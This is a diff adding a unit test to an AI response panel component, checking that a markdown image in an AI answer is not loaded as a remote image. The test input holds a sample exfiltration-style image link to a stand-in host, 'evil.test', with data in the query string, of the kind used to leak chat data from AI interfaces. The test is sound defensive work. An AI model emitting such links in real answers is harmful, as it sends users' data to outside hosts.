@@ -37,6 +37,13 @@ describe("AIResponsePanel", () => {
   });
   afterEach(() => vi.useRealTimers());
 
+  it("an answer never loads a remote image", () => {
+    const { container } = render(<AIResponsePanel />);
+    answer("Assist", "Look ![x](https://evil.test/p.png?d=1) here");
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.textContent).toContain("[Image: x]");
+  });
+
   it("Current is the newest answer and is not repeated as a tab", () => {
     render(<AIResponsePanel />);
     answer("Assist", "first");
